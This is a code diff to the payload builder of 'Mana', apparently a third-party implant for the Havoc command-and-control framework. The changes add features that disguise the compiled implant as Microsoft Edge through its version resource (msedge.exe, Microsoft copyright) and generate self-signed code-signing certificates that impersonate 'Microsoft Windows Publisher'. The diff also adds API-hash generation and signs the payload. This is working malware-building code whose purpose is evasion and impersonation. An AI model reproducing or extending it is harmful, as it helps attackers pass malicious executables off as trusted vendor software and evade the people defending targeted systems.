@@ -8,6 +8,7 @@ import subprocess
 import re
 import random
 import tempfile
+import secrets
 
 COMMAND_REGISTER         = 0x100
 COMMAND_GET_JOB          = 0x101
@@ -39,9 +40,192 @@ COMMAND_EXECUTE_ASSEMBLY = 0x160
 # ===== Configuration ==========
 # ==============================
 
+SIGNING_DIR = "./scripts/signing"
+KEY_FILE = f"{SIGNING_DIR}/key.pem"
+CERT_FILE = f"{SIGNING_DIR}/cert.pem"
+PFX_FILE = f"{SIGNING_DIR}/sign.pfx"
+PASSWORDS_FILE = f"{SIGNING_DIR}/password.txt"
+
 DONUT_PATH = "/home/kali/mdev/donut"
 PROFILE_PATH = "/home/kali/c2/Havoc/profiles/wkl_sample.yaotl"
 CONFIG_OUTPUT = "./Include/Config.h"
+RESOURCE_RC_CONFIG_OUTPUT = "./Include/Resource.rc"
+
+
+def generate_random_password(length: int = 24) -> str:
+    """Generate a cryptographically secure random password"""
+    alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
+    return ''.join(secrets.choice(alphabet) for _ in range(length))
+
+
+def save_passwords(key_password: str, pfx_password: str, cert_info: dict = None) -> str:
+    """Save passwords to file and return the file path"""
+    
+    os.makedirs(SIGNING_DIR, exist_ok=True)
+    
+    content = f"""# Mana Code Signing Credentials
+# Generated: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+# ==========================================
+
+KEY_PASSWORD={key_password}
+PFX_PASSWORD={pfx_password}
+
+# File locations:
+# Key:  {KEY_FILE}
+# Cert: {CERT_FILE}
+# PFX:  {PFX_FILE}
+"""
+
+    if cert_info:
+        content += f"""
+# Certificate Info:
+# Country:      {cert_info.get('country', 'N/A')}
+# State:        {cert_info.get('state', 'N/A')}
+# City:         {cert_info.get('city', 'N/A')}
+# Organization: {cert_info.get('org', 'N/A')}
+# Unit:         {cert_info.get('ou', 'N/A')}
+# Common Name:  {cert_info.get('cn', 'N/A')}
+# Email:        {cert_info.get('email', 'N/A')}
+"""
+    
+    with open(PASSWORDS_FILE, 'w') as f:
+        f.write(content)
+    
+    # Set restrictive permissions (owner read/write only)
+    os.chmod(PASSWORDS_FILE, 0o600)
+    
+    return PASSWORDS_FILE
+
+
+def generate_codesigning_cert(signing_config: dict) -> tuple:
+    """
+    Generate self-signed code signing certificate with random passwords.
+    Returns (success: bool, message: str, passwords: dict)
+    """
+    
+    os.makedirs(SIGNING_DIR, exist_ok=True)
+    
+    # Generate random passwords
+    key_password = generate_random_password(24)
+    pfx_password = generate_random_password(24)
+    
+    # Get signing config
+    country = signing_config.get('Country Name (2 letter code) [AU]', 'US')
+    state = signing_config.get('State or Province Name (full name) [Some-State]', 'Washington')
+    city = signing_config.get('Locality Name (eg, city) []', 'Redmond')
+    org = signing_config.get('Organization Name (eg, company) [Internet Widgits Pty Ltd]', 'Microsoft Corporation')
+    ou = signing_config.get('Organizational Unit Name (eg, section) []', 'Windows Security')
+    cn = signing_config.get('Common Name (e.g. server FQDN or YOUR name) []', 'Microsoft Windows Publisher')
+    email = signing_config.get('Email Address []', 'code-signing@microsoft.com')
+    
+    subject = f"/C={country}/ST={state}/L={city}/O={org}/OU={ou}/CN={cn}/emailAddress={email}"
+    
+    cert_info = {
+        'country': country,
+        'state': state,
+        'city': city,
+        'org': org,
+        'ou': ou,
+        'cn': cn,
+        'email': email
+    }
+    
+    passwords = {
+        'key': key_password,
+        'pfx': pfx_password
+    }
+    
+    try:
+        # Generate private key and self-signed certificate
+        cmd_cert = [
+            'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
+            '-keyout', KEY_FILE,
+            '-out', CERT_FILE,
+            '-sha256', '-days', '365',
+            '-subj', subject,
+            '-passout', f'pass:{key_password}'
+        ]
+        
+        result = subprocess.run(cmd_cert, capture_output=True, text=True)
+        if result.returncode != 0:
+            return False, f"Certificate generation failed: {result.stderr}", None
+        
+        # Export to PKCS#12 (PFX)
+        cmd_pfx = [
+            'openssl', 'pkcs12', '-export',
+            '-inkey', KEY_FILE,
+            '-in', CERT_FILE,
+            '-out', PFX_FILE,
+            '-passin', f'pass:{key_password}',
+            '-passout', f'pass:{pfx_password}',
+            '-name', cn
+        ]
+        
+        result = subprocess.run(cmd_pfx, capture_output=True, text=True)
+        if result.returncode != 0:
+            return False, f"PFX export failed: {result.stderr}", None
+        
+        # Save passwords to file
+        passwords_file = save_passwords(key_password, pfx_password, cert_info)
+        
+        return True, f"Certificate generated (passwords saved to {passwords_file})", passwords
+        
+    except Exception as e:
+        return False, f"Certificate generation error: {str(e)}", None
+
+
+def sign_executable(exe_path: str, output_path: str, pfx_password: str, description: str = "Signed Application") -> tuple:
+    """
+    Sign an executable using osslsigncode.
+    Returns (success: bool, message: str)
+    """
+    
+    if not os.path.exists(PFX_FILE):
+        return False, f"PFX file not found: {PFX_FILE}"
+    
+    if not os.path.exists(exe_path):
+        return False, f"Input EXE not found: {exe_path}"
+    
+    try:
+        cmd = [
+            'osslsigncode', 'sign',
+            '-pkcs12', PFX_FILE,
+            '-pass', pfx_password,
+            '-n', description,
+            '-t', 'http://timestamp.digicert.com',
+            '-in', exe_path,
+            '-out', output_path
+        ]
+        
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        
+        if result.returncode != 0:
+            return False, f"Signing failed: {result.stderr}"
+        
+        if not os.path.exists(output_path):
+            return False, "Signed file not created"
+        
+        return True, f"Signed: {output_path}"
+        
+    except FileNotFoundError:
+        return False, "osslsigncode not found. Install with: apt install osslsigncode"
+    except Exception as e:
+        return False, f"Signing error: {str(e)}"
+
+
+def verify_signature(exe_path: str) -> tuple:
+    """Verify executable signature."""
+    try:
+        cmd = ['osslsigncode', 'verify', exe_path]
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            return True, "Signature valid"
+        else:
+            return False, f"Signature invalid: {result.stdout}"
+            
+    except Exception as e:
+        return False, f"Verification error: {str(e)}"
 
 
 # ====================
@@ -360,8 +544,6 @@ def generate_shellcode_from_exe(exe_path):
     return None
 
 
-
-
 # ==============================
 # ===== Profile Parser =========
 # ==============================
@@ -524,6 +706,8 @@ static LPCWSTR CONFIG_HEADERS[] = {{
     return config_h
 
 
+
+
 # ==============================
 # ===== Agent Type =============
 # ==============================
@@ -532,7 +716,7 @@ class Mana(AgentType):
 
     Name        = "Mana"
     Author      = "damaidec"
-    Version     = "0.1"
+    Version     = "0.3"
     Description = f"""3rd party agent for Havoc"""
     MagicValue  = 0x6d616e61  # 'mana'
 
@@ -557,8 +741,32 @@ class Mana(AgentType):
     ]
 
     BuildingConfig = {
-        "Sleep": "10",
-        "Jitter": "20",
+        "1. Jitter": "20",
+        "2. Sleep": "10",
+        "3. ResourceSection": {
+        "FILEVERSION":"146, 0, 3856, 109",
+        "PRODUCTVERSION": "146, 0, 3856, 109",
+        "CompanyName": "Microsoft",
+        "FileDescription": "Microsoft Edge",
+        "InternalName": "Msedge",
+        "LegalCopyright": "Copyright Microsoft Corporation. All rights reserved.",
+        "OriginalFilename": "msedge.exe",
+        "ProductName": "Microsoft Edge",
+        "ProductVersion": "146.0.3856.109",
+        },
+        "4. SignPayload": False,
+        "5. CodeSigning": {
+        "Country Name (2 letter code) [AU]": "US",
+        "State or Province Name (full name) [Some-State]": "Washington",
+        "Locality Name (eg, city) []": "Redmond",
+        "Organization Name (eg, company) [Internet Widgits Pty Ltd]": "Microsoft Corporation",
+        "Organizational Unit Name (eg, section) []": "Windows Security",
+        "Common Name (e.g. server FQDN or YOUR name) []": "Microsoft Windows Publisher",
+        "Email Address []": "code-signing@microsoft.com",
+        },
+        "6. Checkbox": False,
+        "7. Dropdown":{"Method":["test","test2"]}
+
     }
 
     Commands = [
@@ -574,6 +782,7 @@ class Mana(AgentType):
         CommandExecuteAssembly(),
     ]
 
+
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
     def generate(self, config: dict) -> None:
         """
@@ -583,14 +792,51 @@ class Mana(AgentType):
         
         # Get listener name from UI
         listener_name = config['Options']['Listener']['Name']
-        
         # Get sleep/jitter from build config
-        sleep = int(config['Config'].get('Sleep', '10'))
-        jitter = int(config['Config'].get('Jitter', '20'))
+        sleep = int(config['Config'].get('2. Sleep', '10'))
+        jitter = int(config['Config'].get('1. Jitter', '20'))
+
+         # Check if signing is enabled
+        sign_payload = config['Config'].get('4. SignPayload', False)
+        should_sign = sign_payload
+
+        # Config build for resource RC
+        compname = config['Config']['3. ResourceSection'].get('CompanyName')
+        filever = config['Config']['3. ResourceSection'].get('FILEVERSION')
+        filedesc = config['Config']['3. ResourceSection'].get('FileDescription')
+        internalName = config['Config']['3. ResourceSection'].get('InternalName')
+        copyright = config['Config']['3. ResourceSection'].get('LegalCopyright')
+        origfilename = config['Config']['3. ResourceSection'].get('OriginalFilename')
+        productver = config['Config']['3. ResourceSection'].get('PRODUCTVERSION')
+        productname = config['Config']['3. ResourceSection'].get('ProductName')
+        productversion = config['Config']['3. ResourceSection'].get('ProductVersion')
 
         self.builder_send_message(config['ClientID'], "Info", f"[*] Listener: {listener_name}")
         self.builder_send_message(config['ClientID'], "Info", f"[*] Sleep: {sleep}s, Jitter: {jitter}%")
+
+
+        if should_sign:
+            self.builder_send_message(config['ClientID'], "Info", "[*] Code signing: ENABLED")
         
+        result = subprocess.run(
+        ["python3", "hash.py"],
+        capture_output=True,
+        text=True,
+        cwd="scripts")
+
+        if result.returncode != 0:
+            print(f"[!] hash.py error: {result.stderr}")
+        else:
+            print(f"[+] hash.py output: {result.stdout}")
+        hash_output = result.stdout.strip()
+    
+        # Extract the seed value
+        for line in hash_output.split('\n'):
+            if 'Using hash seed' in line:
+                seed = line.split(':')[-1].strip()
+                self.builder_send_message(config['ClientID'], "Info", f"[*] Generated API hashes with seed: {seed}")
+            break
+
         # Parse profile to get listener config
         listener = HavocProfileParser(PROFILE_PATH, listener_name)
         
@@ -608,19 +854,133 @@ class Mana(AgentType):
             jitter=jitter,
             magic=self.MagicValue
         )
+
+        # Generate resource.rc config
+        Resourceconfig_h = f'''
+// Microsoft Visual C++ generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "winres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// English (United States) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+LANGUAGE 9, 1
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE  
+BEGIN
+    "resource.h\\0"
+END
+
+2 TEXTINCLUDE  
+BEGIN
+    "#include ""winres.h""\\r\\n"
+    "\\0"
+END
+
+3 TEXTINCLUDE  
+BEGIN
+    "\\r\\n"
+    "\\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+#endif    // English (United States) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+1 VERSIONINFO
+FILEVERSION {filever}
+PRODUCTVERSION {productver}
+FILEFLAGSMASK 0x0L
+#ifdef _DEBUG
+FILEFLAGS 0x1L
+#else
+FILEFLAGS 0x0L
+#endif
+FILEOS 0x0L
+FILETYPE 0x0L
+FILESUBTYPE 0x0L
+BEGIN
+BLOCK "StringFileInfo"
+BEGIN
+BLOCK "040904B0" //English US, Unicode code page
+BEGIN
+VALUE "CompanyName", "{compname}"
+VALUE "FileDescription", "{filedesc}"
+VALUE "InternalName", "{internalName}"
+VALUE "LegalCopyright", "{copyright}"
+VALUE "OriginalFilename", "{origfilename}"
+VALUE "ProductName", "{productname}"
+VALUE "ProductVersion", "{productversion}"
+END
+END
+BLOCK "VarFileInfo"
+BEGIN
+VALUE "Translation", 0x409, 1200
+END
+END
+        '''
+
+        
         
         # Write config.h
         with open(CONFIG_OUTPUT, 'w') as f:
             f.write(config_h)
+
+        # Write resource.rc 
+        with open(RESOURCE_RC_CONFIG_OUTPUT, 'w') as f:
+             f.write(Resourceconfig_h)
         
         self.builder_send_message(config['ClientID'], "Good", f"[+] Generated: {CONFIG_OUTPUT}")
+        self.builder_send_message(config['ClientID'], "Good", f"[+] Generated: {RESOURCE_RC_CONFIG_OUTPUT}")
         
+        # Clean and recompile with new Defines.h + Config.h
+        self.builder_send_message(config['ClientID'], "Info", "[*] Compiling...")
         
-        if config['Options']['Format'] == "Windows Shellcode":
-            exe_path = "./Bin/Mana.exe"
-            self.builder_send_message(config['ClientID'], "Info", "[*] Converting to shellcode...")
-            shellcode = generate_shellcode_from_exe(exe_path)
+        subprocess.run(["make", "clean"], capture_output=True, text=True)
+        build = subprocess.run(["make"], capture_output=True, text=True)
+    
+        if build.returncode != 0:
+            self.builder_send_message(config['ClientID'], "Error", f"[!] Build failed:\n{build.stderr}")
+            return
+        
+        self.builder_send_message(config['ClientID'], "Good", "[+] Build successful")
 
+        # exe paths
+        unsigned_exe = "./Bin/Mana.exe"
+        signed_exe = "./Bin/Mana_signed.exe"
+        if config['Options']['Format'] == "Windows Shellcode":
+            self.builder_send_message(config['ClientID'], "Info", "[*] Converting to shellcode...")
+            shellcode = generate_shellcode_from_exe(unsigned_exe)
+            
             if shellcode:
                 self.builder_send_message(config['ClientID'], "Good", f"[+] Shellcode size: {len(shellcode)} bytes")
                 self.builder_send_payload(config['ClientID'], f"{self.Name}.bin", shellcode)
@@ -628,17 +988,82 @@ class Mana(AgentType):
                 self.builder_send_message(config['ClientID'], "Error", "[!] Shellcode generation failed")
 
         elif config['Options']['Format'] == "Windows Executable":
-            # Build with cmake
-            self.builder_send_message(config['ClientID'], "Info", "[*] Compiling...")
-            os.system("cmake . && make")
+            # Generate unsigned exe first
 
             # Read compiled binary
-            data = open("./Bin/Mana.exe", "rb").read()
-            
-            self.builder_send_message(config['ClientID'], "Good", f"[+] Size: {len(data)} bytes")
+            with open(unsigned_exe, "rb") as f:
+                unsigned_data = f.read()
+        
+            self.builder_send_message(config['ClientID'], "Good", f"[+] Unsigned EXE size: {len(unsigned_data)} bytes")
+            self.builder_send_payload(config['ClientID'], f"{self.Name}.exe", unsigned_data)
 
-            # build_send_payload. this function send back your generated payload
-            self.builder_send_payload(config['ClientID'], self.Name + ".exe", data)
+            # Code signing
+
+            if should_sign:
+                self.builder_send_message(config['ClientID'], "Info", "[*] Generating code signing certificate...")
+            
+                # Generate certificate with random passwords
+                success, msg, passwords = generate_codesigning_cert(config['Config'].get('5. CodeSigning', {}))
+                
+                if success and passwords:
+                    self.builder_send_message(config['ClientID'], "Good", f"[+] {msg}")
+                    
+                    # Display passwords in console
+                    self.builder_send_message(config['ClientID'], "Info", "[*] ========== SIGNING CREDENTIALS ==========")
+                    self.builder_send_message(config['ClientID'], "Info", f"[*] Key Password: {passwords['key']}")
+                    self.builder_send_message(config['ClientID'], "Info", f"[*] PFX Password: {passwords['pfx']}")
+                    self.builder_send_message(config['ClientID'], "Info", f"[*] Saved to: {PASSWORDS_FILE}")
+                    self.builder_send_message(config['ClientID'], "Info", "[*] ==========================================")
+                    
+                    # Also print to terminal
+                    print("\n" + "=" * 50)
+                    print("CODE SIGNING CREDENTIALS")
+                    print("=" * 50)
+                    print(f"Key Password: {passwords['key']}")
+                    print(f"PFX Password: {passwords['pfx']}")
+                    print(f"Saved to:     {PASSWORDS_FILE}")
+                    print("=" * 50 + "\n")
+                    
+                else:
+                    self.builder_send_message(config['ClientID'], "Error", f"[!] {msg}")
+                    self.builder_send_message(config['ClientID'], "Info", "[*] Skipping signed version")
+                    return
+                
+                self.builder_send_message(config['ClientID'], "Info", "[*] Signing executable...")
+                
+                # Sign the EXE using the generated password
+                success, msg = sign_executable(
+                    exe_path=unsigned_exe,
+                    output_path=signed_exe,
+                    pfx_password=passwords['pfx'],
+                    description=filedesc
+                )
+                
+                if success:
+                    self.builder_send_message(config['ClientID'], "Good", f"[+] {msg}")
+                    
+                    # Verify signature
+                    verify_success, verify_msg = verify_signature(signed_exe)
+                    if verify_success:
+                        self.builder_send_message(config['ClientID'], "Good", "[+] Signature verified")
+                    else:
+                        self.builder_send_message(config['ClientID'], "Info", f"[*] Verification: {verify_msg}")
+                    
+                    # Send signed EXE
+                    with open(signed_exe, "rb") as f:
+                        signed_data = f.read()
+                    
+                    self.builder_send_message(config['ClientID'], "Good", f"[+] Signed EXE size: {len(signed_data)} bytes")
+                    self.builder_send_payload(config['ClientID'], f"{self.Name}_signed.exe", signed_data)
+                    
+                    # Summary
+                    self.builder_send_message(config['ClientID'], "Good", "[+] ========== OUTPUT FILES ==========")
+                    self.builder_send_message(config['ClientID'], "Info", f"    1. {self.Name}.exe (unsigned)")
+                    self.builder_send_message(config['ClientID'], "Info", f"    2. {self.Name}_signed.exe (signed)")
+                    self.builder_send_message(config['ClientID'], "Info", f"    3. {PASSWORDS_FILE} (credentials)")
+                    self.builder_send_message(config['ClientID'], "Good", "[+] =====================================")
+                else:
+                    self.builder_send_message(config['ClientID'], "Error", f"[!] Signing failed: {msg}")
         else:
             self.builder_send_message(config['ClientID'], "Info", "[*] Something failes check agent.py...")
     
